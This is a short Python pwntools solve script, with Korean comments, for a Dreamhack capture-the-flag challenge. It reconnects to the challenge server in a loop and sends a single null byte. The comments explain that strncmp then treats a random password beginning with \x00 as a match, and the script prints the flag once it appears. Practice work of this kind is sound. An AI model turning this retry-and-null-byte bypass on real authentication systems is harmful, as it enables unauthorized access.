from pwn import *

# 로그가 너무 많이 뜨면 정신없으니 에러만 출력
context.log_level = 'error'

while True:
    try:
        # 1. 접속
        p = remote('host8.dreamhack.games', 8636)

        # 2. "can u guess me?" 메시지 대기
        p.recvuntil("?")

        # 3. 공격: Null Byte 하나만 전송 (혹은 그냥 엔터)
        # strncmp(random_pwd, "\x00", 8) 
        # 만약 random_pwd가 \x00으로 시작하면 -> 일치(0) 판정!
        p.sendline(b'\x00') 

        # 4. 결과 확인
        data = p.recvall(timeout=1)
        
        # 플래그 형식(DH)이 보이면 출력하고 종료
        if b'DH{' in data:
            print("[+] FOUND FLAG !!!")
            print(data.decode())
            break
        else:
            print("[-] Failed... retrying")
            p.close()
            
    except Exception as e:
        # 에러 나면 그냥 재시도
        p.close()
        continue